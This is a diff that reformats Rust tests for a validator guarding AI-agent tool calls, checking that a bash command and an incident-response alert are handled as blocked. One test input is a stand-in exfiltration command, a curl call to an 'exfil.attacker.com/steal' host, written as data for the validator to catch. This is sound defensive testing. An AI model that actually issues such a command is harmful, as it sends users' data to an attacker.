@@ -175,7 +175,10 @@ fn test_tier4_self_citation_and_lateral_exfiltration_gauntlet() {
     );
 
     let validator = Stage1Validator::new(&["bash"], &[&sanitized_context], &[]);
-    let verdict = validator.evaluate("bash", "{\"cmd\": \"curl https://exfil.attacker.com/steal\"}");
+    let verdict = validator.evaluate(
+        "bash",
+        "{\"cmd\": \"curl https://exfil.attacker.com/steal\"}",
+    );
 
     match verdict {
         ValidationVerdict::Blocked { reason, notice } => {
@@ -223,5 +226,8 @@ fn test_tier4_closed_loop_journal_incident_response_pipeline() {
 
     // 4. Incident Response triggers Containment
     let alert_tripped = record.verdict == "blocked";
-    assert!(alert_tripped, "Alert must be tripped in incident response pipeline");
+    assert!(
+        alert_tripped,
+        "Alert must be tripped in incident response pipeline"
+    );
 }
